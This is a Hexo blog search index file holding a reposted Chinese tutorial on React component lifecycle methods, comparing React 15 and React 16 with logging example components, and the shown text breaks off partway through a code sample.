<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>深入浅出 React -- 生命周期</title>
      <link href="/2023/04/07/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-React-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
      <url>/2023/04/07/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-React-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://zhuanlan.zhihu.com/p/333822652">深入浅出 React – 生命周期</a><br>这里通过对 React15 和 React16 两个版本的生命周期进行对比总结，来建立系统而完善的生命周期知识体系.</p><h1 id="生命周期背后的设计思想"><a href="#生命周期背后的设计思想" class="headerlink" title="生命周期背后的设计思想"></a>生命周期背后的设计思想</h1><p>React 设计的两个核心概念：“组件” 和 “虚拟 DOM”</p><h3 id="虚拟-DOM"><a href="#虚拟-DOM" class="headerlink" title="虚拟 DOM"></a>虚拟 DOM</h3><p>当组件初始化时，通过调用生命周期中的 render 方法，生成虚拟 DOM；再通过调用 <code>ReactDOM.render</code> 方法，将虚拟 DOM 转换为真实 DOM。</p><p>当组件更新时，会再次调用生命周期中的 render 方法，生成新的虚拟 DOM；然后通过 diff 算法定位两次虚拟 DOM 的差异，对发生变化的真实 DOM 做定向更新。</p><h3 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h3><p>在一个 React 项目中，几乎所有的内容都可以抽离为各种各样的组件，每个组件既是 “封闭” 的，也是 “开放” 的。</p><p>所谓 “封闭”，是针对<strong>组件数据改变到组件实际发生更新</strong>的过程。在组件自身的渲染过程中，每个组件都只会处理它自身内部的渲染逻辑。在没有数据交流的情况下，组件之间互不干扰。</p><p>所谓 “开放”，是针对组件间<strong>通信</strong>的。React 允许开发者基于<strong>单向数据流</strong>的原则来完成组件之间的通信。组件之间的通信可能使通信组件的渲染结果产生影响。所以说组件之间是相互开放的，可以相互影响的。</p><p>React 组件的 “开放” 与 “封闭” 特性，使得 React 的组件具备高可重用性和可维护性。</p><h3 id="生命周期方法"><a href="#生命周期方法" class="headerlink" title="生命周期方法"></a>生命周期方法</h3><p>生命周期的 render 方法将<strong>虚拟 DOM</strong>和<strong>组件</strong>两者结合到了一起。</p><p>虚拟 DOM 的生成依赖 render，而组件的渲染过程也离不开 render。所以可以将 render 方法比作组件的<strong>“灵魂”</strong>。</p><p>render 之外的生命周期方法可以理解为组件的<strong>“躯干”</strong>。</p><p>我们可以省略 render 之外的任何生命周期方法内容的编写，但是 render 函数不能省略；但是 render 之外的生命周期方法的编写，通常是为 render 服务；“灵魂” 和 “躯干” 共同构成了 React 组件完整的生命时间轴。</p><h1 id="React15-生命周期"><a href="#React15-生命周期" class="headerlink" title="React15 生命周期"></a>React15 生命周期</h1><p>在 React15 中，需要关注以下生命周期方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">constructor()</span><br><span class="line">componentWillReceiveProps()</span><br><span class="line">shouldComponentUpdate()</span><br><span class="line">componentWillMount()</span><br><span class="line">componentWillUpdate()</span><br><span class="line">componentDidUpdate()</span><br><span class="line">componentDidMount()</span><br><span class="line">render()</span><br><span class="line">componentWillUnmount()</span><br></pre></td></tr></table></figure><p>这些生命周期方法的关系：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d8135157f8c54e09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="lifecycle"></p><p>下面的示例可以验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">import React from &quot;react&quot;</span><br><span class="line">import ReactDOM from &quot;react-dom&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码源自 “深入浅出搞定 React -- 修言”</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义子组件</span><br><span class="line">class LifeCycle extends React.Component &#123;</span><br><span class="line">  constructor(props) &#123;</span><br><span class="line">    console.log(&quot;进入constructor&quot;)</span><br><span class="line"></span><br><span class="line">    super(props)</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; state 可以在 constructor 里初始化</span><br><span class="line">    this.state &#x3D; &#123; text: &quot;子组件的文本&quot; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 初始化渲染时调用</span><br><span class="line">  componentWillMount() &#123;</span><br><span class="line">    console.log(&quot;componentWillMount方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 初始化渲染时调用</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    console.log(&quot;componentDidMount方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 父组件修改组件的props时会调用</span><br><span class="line">  componentWillReceiveProps(nextProps) &#123;</span><br><span class="line">    console.log(&quot;componentWillReceiveProps方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 组件更新时调用</span><br><span class="line">  shouldComponentUpdate(nextProps, nextState) &#123;</span><br><span class="line">    console.log(&quot;shouldComponentUpdate方法执行&quot;)</span><br><span class="line">    return true</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 组件更新时调用</span><br><span class="line">  componentWillUpdate(nextProps, nextState) &#123;</span><br><span class="line">    console.log(&quot;componentWillUpdate方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 组件更新后调用</span><br><span class="line">  componentDidUpdate(nextProps, nextState) &#123;</span><br><span class="line">    console.log(&quot;componentDidUpdate方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 组件卸载时调用</span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    console.log(&quot;子组件的componentWillUnmount方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 点击按钮，修改子组件文本内容的方法</span><br><span class="line">  changeText &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      text: &quot;修改后的子组件文本&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    console.log(&quot;render方法执行&quot;)</span><br><span class="line">    return (</span><br><span class="line">      &lt;div className&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;button onClick&#x3D;&#123;this.changeText&#125; className&#x3D;&quot;changeText&quot;&gt;</span><br><span class="line">          修改子组件文本内容</span><br><span class="line">        &lt;&#x2F;button&gt;</span><br><span class="line">        &lt;p className&#x3D;&quot;textContent&quot;&gt;&#123;this.state.text&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p className&#x3D;&quot;fatherContent&quot;&gt;&#123;this.props.text&#125;&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义 LifeCycle 组件的父组件</span><br><span class="line">class LifeCycleContainer extends React.Component &#123;</span><br><span class="line">  &#x2F;&#x2F; state 也可以像这样用属性声明的形式初始化</span><br><span class="line">  state &#x3D; &#123;</span><br><span class="line">    text: &quot;父组件的文本&quot;,</span><br><span class="line">    hideChild: false</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F; 点击按钮，修改父组件文本的方法</span><br><span class="line">  changeText &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      text: &quot;修改后的父组件文本&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F; 点击按钮，隐藏（卸载）LifeCycle 组件的方法</span><br><span class="line">  hideChild &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      hideChild: true</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div className&#x3D;&quot;fatherContainer&quot;&gt;</span><br><span class="line">        &lt;button onClick&#x3D;&#123;this.changeText&#125; className&#x3D;&quot;changeText&quot;&gt;</span><br><span class="line">          修改父组件文本内容</span><br><span class="line">        &lt;&#x2F;button&gt;</span><br><span class="line">        &lt;button onClick&#x3D;&#123;this.hideChild&#125; className&#x3D;&quot;hideChild&quot;&gt;</span><br><span class="line">          隐藏子组件</span><br><span class="line">        &lt;&#x2F;button&gt;</span><br><span class="line">        &#123;this.state.hideChild ? null : &lt;LifeCycle text&#x3D;&#123;this.state.text&#125; &#x2F;&gt;&#125;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(&lt;LifeCycleContainer &#x2F;&gt;, document.getElementById(&quot;root&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="挂载阶段"><a href="#挂载阶段" class="headerlink" title="挂载阶段"></a>挂载阶段</h3><p>组件挂载在一个 React 组件的生命周期中只会发生一次，在这个过程中，组件被初始化，最后被渲染到真实 DOM；</p><p>挂载阶段，一个 React 组件所经历的生命周期：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b59d20d9452ce35c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="load"></p><ul><li><code>constructor() </code>：对 this.state 初始化。</li><li><code>componentWillMount()</code> ：在 <code>render</code> 方法前被触发。</li><li><code> render()</code> ：生成需要渲染的内容并返回，不会操作真实 DOM。真实 DOM 的渲染由 ReactDOM.render 完成。</li><li><code>componentDidMount()</code> ：在渲染结束后被触发，此时可以访问真实 DOM 。在这个生命周期中也可以做类似于异步请求、数据初始化的操作。</li></ul><h3 id="更新阶段"><a href="#更新阶段" class="headerlink" title="更新阶段"></a>更新阶段</h3><p>更新阶段，一个 React 组件所经历的生命周期：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-abeb1ef4f13b2211.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="update"></p><h4 id="componentWillReceiveProps"><a href="#componentWillReceiveProps" class="headerlink" title="componentWillReceiveProps"></a>componentWillReceiveProps</h4><p>从图中可以看出，由父组件触发的更新和由组件自身触发的更新对比，多出了一个生命周期方法：<code>componentWillReceiveProps(nextProps)</code>。</p><p><code>nextProps</code> 表示新 <code>props</code> 内容，而现有的 <code>props</code> 可以通过 <code>this.props</code> 获取，从而对比 <code>props</code> 的变化。</p><blockquote><p>如果父组件导致组件重新渲染，即使 props 没有更改，也会调用此方法（componentWillReceiveProps）。如果只想处理更改，请确保进行当前值与变更值的比较。</p></blockquote><p><strong>componentWillReceiveProps 并不是由 props 的变化触发的，而是由父组件的更新触发的</strong></p><h4 id="shouldComponentUpdate"><a href="#shouldComponentUpdate" class="headerlink" title="shouldComponentUpdate"></a>shouldComponentUpdate</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shouldComponentUpdate(nextProps, nextState)</span><br></pre></td></tr></table></figure><p>由于 <code>render</code> 方法会进行虚拟 DOM 的构建和对比，比较耗时。为了避免不必要的 <code>render</code> 调用，React 提供了 <code>shouldComponentUpdate</code> 生命周期方法。</p><p>根据 <code>shouldComponentUpdate()</code> 的返回值，判断 React 组件的输出是否受当前 state 或 props 更改的影响。默认行为是 state 每次发生变化组件都会重新渲染。大部分情况下，你应该遵循默认行为。</p><p>此方法仅作为**<a href="https://link.zhihu.com/?target=https://zh-hans.reactjs.org/docs/optimizing-performance.html">性能优化的方式</a><strong>而存在。不要企图依靠此方法来“阻止”渲染，因为这可能会产生 bug。你应该考虑使用内置的 **<a href="https://link.zhihu.com/?target=https://zh-hans.reactjs.org/docs/react-api.html%23reactpurecomponent">PureComponent</a></strong> 组件，而不是手动编写 <code>shouldComponentUpdate()</code>。<code>PureComponent</code> 会对 props 和 state 进行浅层比较，并减少了跳过必要更新的可能性。</p><h4 id="componentWillUpdate-和-componentDidUpdate"><a href="#componentWillUpdate-和-componentDidUpdate" class="headerlink" title="componentWillUpdate 和 componentDidUpdate"></a>componentWillUpdate 和 componentDidUpdate</h4><p> <code>componentWillUpdate</code> 在 <code>render</code> 前触发，和 <code>componentWillMount </code>类似，可以在里面做一些与真实 DOM 不相关的操作。<br><code>componentDidUpdate</code> 在组件更新完成后触发，和 <code>componentDidMount</code> 类似，可以在里面处理 DOM 操作；作为子组件更新完毕通知父组件的标志。</p><h3 id="卸载阶段"><a href="#卸载阶段" class="headerlink" title="卸载阶段"></a>卸载阶段</h3><p>组件销毁，只有 <code>componentWillUnmount()</code> 生命周期，可以在里面做一些释放内存，清理定时器等操作。</p><h1 id="React16-生命周期"><a href="#React16-生命周期" class="headerlink" title="React16 生命周期"></a>React16 生命周期</h1><p><strong><a href="https://link.zhihu.com/?target=https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/">React 16.3</a></strong> 生命周期：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-57657b484fefd006.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="React16"></p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">import React from &quot;react&quot;</span><br><span class="line">import ReactDOM from &quot;react-dom&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码源自 “深入浅出搞定 React -- 修言”</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义子组件</span><br><span class="line">class LifeCycle extends React.Component &#123;</span><br><span class="line">  constructor(props) &#123;</span><br><span class="line">    console.log(&quot;进入constructor&quot;)</span><br><span class="line"></span><br><span class="line">    super(props)</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; state 可以在 constructor 里初始化</span><br><span class="line">    this.state &#x3D; &#123; text: &quot;子组件的文本&quot; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 初始化&#x2F;更新时调用</span><br><span class="line">  static getDerivedStateFromProps(props, state) &#123;</span><br><span class="line">    console.log(&quot;getDerivedStateFromProps方法执行&quot;)</span><br><span class="line">    return &#123;</span><br><span class="line">      fatherText: props.text</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 初始化渲染时调用</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    console.log(&quot;componentDidMount方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 组件更新时调用</span><br><span class="line">  shouldComponentUpdate(prevProps, nextState) &#123;</span><br><span class="line">    console.log(&quot;shouldComponentUpdate方法执行&quot;)</span><br><span class="line">    return true</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 组件更新时调用</span><br><span class="line">  getSnapshotBeforeUpdate(prevProps, prevState) &#123;</span><br><span class="line">    console.log(&quot;getSnapshotBeforeUpdate方法执行&quot;)</span><br><span class="line">    return &quot;haha&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 组件更新后调用</span><br><span class="line">  componentDidUpdate(nextProps, nextState, valueFromSnapshot) &#123;</span><br><span class="line">    console.log(&quot;componentDidUpdate方法执行&quot;)</span><br><span class="line">    console.log(&quot;从 getSnapshotBeforeUpdate 获取到的值是&quot;, valueFromSnapshot)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 组件卸载时调用</span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    console.log(&quot;子组件的componentWillUnmount方法执行&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 点击按钮，修改子组件文本内容的方法</span><br><span class="line">  changeText &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      text: &quot;修改后的子组件文本&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    console.log(&quot;render方法执行&quot;);</span><br><span class="line">    return (</span><br><span class="line">      &lt;div className&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;button onClick&#x3D;&#123;this.changeText&#125; className&#x3D;&quot;changeText&quot;&gt;</span><br><span class="line">          修改子组件文本内容</span><br><span class="line">        &lt;&#x2F;button&gt;</span><br><span class="line">        &lt;p className&#x3D;&quot;textContent&quot;&gt;&#123;this.state.text&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p className&#x3D;&quot;fatherContent&quot;&gt;&#123;this.props.text&#125;&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义 LifeCycle 组件的父组件</span><br><span class="line">class LifeCycleContainer extends React.Component &#123;</span><br><span class="line">  &#x2F;&#x2F; state 也可以像这样用属性声明的形式初始化</span><br><span class="line">  state &#x3D; &#123;</span><br><span class="line">    text: &quot;父组件的文本&quot;,</span><br><span class="line">    hideChild: false</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 点击按钮，修改父组件文本的方法</span><br><span class="line">  changeText &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      text: &quot;修改后的父组件文本&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 点击按钮，隐藏（卸载）LifeCycle 组件的方法</span><br><span class="line">  hideChild &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      hideChild: true</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div className&#x3D;&quot;fatherContainer&quot;&gt;</span><br><span class="line">        &lt;button onClick&#x3D;&#123;this.changeText&#125; className&#x3D;&quot;changeText&quot;&gt;</span><br><span class="line">          修改父组件文本内容</span><br><span class="line">        &lt;&#x2F;button&gt;</span><br><span class="line">        &lt;button onClick&#x3D;&#123;this.hideChild&#125; className&#x3D;&quot;hideChild&quot;&gt;</span><br><span class="line">          隐藏子组件</span><br><span class="line">        &lt;&#x2F;button&gt;</span><br><span class="line">        &#123;this.state.hideChild ? null : &lt;LifeCycle text&#x3D;&#123;this.state.text&#125; &#x2F;&gt;&#125;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(&lt;LifeCycleContainer &#x2F;&gt;, document.getElementById(&quot;root&quot;))</span><br></pre></td></tr></table></figure><h3 id="挂载阶段-1"><a href="#挂载阶段-1" class="headerlink" title="挂载阶段"></a>挂载阶段</h3><p><img src="https://upload-images.jianshu.io/upload_images/15531792-6c543cf535ed8878.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="LoadCompare"></p><h4 id="componentWillMount-vs-getDerivedStateFromProps"><a href="#componentWillMount-vs-getDerivedStateFromProps" class="headerlink" title="componentWillMount vs getDerivedStateFromProps"></a>componentWillMount vs getDerivedStateFromProps</h4><p>对比于 React 15 废弃了 <code>componentWillMount</code> ，新增了 <code>getDerivedStateFromProps</code>。</p><p><code>componentWillMount</code> 的存在不仅“鸡肋”而且危险，因此它不值得被“替代”，而应该直接废弃。</p><p><code>getDerivedStateFromProps</code> 的设计初衷是替换 <code>componentWillReceiveProps </code>，它有且仅有一个作用：让组件在 <code>props</code> 变化时派生/更新 <code>state</code>。</p><p><code>getDerivedStateFromProps</code> 的方法签名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static getDerivedStateFromProps(props, state)</span><br></pre></td></tr></table></figure><ul><li><code>getDerivedStateFromProps</code> 是一个静态方法；不依赖组件实例；在这个方法里不能访问 <code>this</code>。</li><li>两个参数：<code>props</code> 和 <code>state</code>，分别表示组件接收的来自父组件的 <code>props</code> 和自身的 <code>state</code>。</li><li>需要一个对象作为返回值；如果没有指定返回值，React 会发出警告；**React 需要用这个返回值来更新/派生组件的 <code>stat</code>**；如果不需要，最好直接省略这个方法，否则需要返回 <code>null</code>。</li><li><strong>对 <code>state</code> 的更新不是“覆盖”，而是针对属性的定向更新。</strong></li></ul><h3 id="更新阶段-1"><a href="#更新阶段-1" class="headerlink" title="更新阶段"></a>更新阶段</h3><p><img src="https://upload-images.jianshu.io/upload_images/15531792-42090d46eee62fec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="UpdateCompare"></p><p>React 16.4 的挂载和卸载和 React 16.3 保持一致，更新阶段不同：</p><p><strong><a href="https://link.zhihu.com/?target=https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/">React 16.4</a></strong> 生命周期：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-6cc2b797e68472af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="React16.4"></p><ul><li>在 React 16.4 中，任何因素触发的组件更新都会触发 <code>getDerivedStateFromProps</code>。</li><li>在 React 16.3 中，只有父组件的更新才会触发 <code>getDerivedStateFromProps</code>。</li></ul><h4 id="getDerivedStateFromProps"><a href="#getDerivedStateFromProps" class="headerlink" title="getDerivedStateFromProps"></a>getDerivedStateFromProps</h4><ul><li><code>getDerivedStateFromProps</code> 是为了试图替换 <code>componentWillReceiveProp</code> 而出现的。</li><li><code>getDerivedStateFromProps</code> 不能完全等同于 <code>componentWillReceiveProps</code>。<ul><li>代替实现基于 props 派生 state。</li><li>原则上，它能且只能做这一件事。</li></ul></li></ul><p><strong>为什么要用 <code>getDerivedStateFromProps </code>替换 <code>componentWillReceiveProps</code></strong></p><p>做 <strong>“合理的减法”</strong><br><code>getDerivedStateFromProps</code> 直接被定义为 <code>static </code>方法，使得在其方法内部无法拿到组件实例的 <code>this</code>，也就不能在里面执行类似不合理的 <code>this.setState</code> （可能会导致死循环）这类会产生副作用的操作。</p><p>确保生命周期函数的行为可控可预测，从源头上帮助开发者避免不合理的编码，同时也是为新的Fiber 架构铺路。</p><h4 id="componentWillUpdate-vs-getSnapshotBeforeUpdate"><a href="#componentWillUpdate-vs-getSnapshotBeforeUpdate" class="headerlink" title="componentWillUpdate vs getSnapshotBeforeUpdate"></a>componentWillUpdate vs getSnapshotBeforeUpdate</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getSnapshotBeforeUpdate(prevProps, prevState) &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>执行时机在 <code>render</code> 方法之后，真实 DOM 更新之前</li><li>可以获得 DOM 更新前后的 <code>state</code> 和 <code>props</code> 信息</li><li>返回值将作为<code> componentDidUpdate</code> 的第三个参数</li></ul><p>在实际编程中很少用到，但也有特殊场景需要。</p><p>例如：实现一个内容会发生变化的滚动列表，要求根据滚动列表的内容是否发生变化，来决定是否要记录滚动条的当前位置。</p><p>这个例子中要求我们对比更新前后的数据是否发生变化，还需要获取真实的 DOM 位置信息。</p><p>与<code> componentDidUpdate</code> 配合编程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 组件更新时调用</span><br><span class="line">getSnapshotBeforeUpdate(prevProps, prevState) &#123;</span><br><span class="line">  console.log(&quot;getSnapshotBeforeUpdate方法执行&quot;)</span><br><span class="line">  return &quot;haha&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 组件更新后调用</span><br><span class="line">componentDidUpdate(prevProps, prevState, valueFromSnapshot) &#123;</span><br><span class="line">  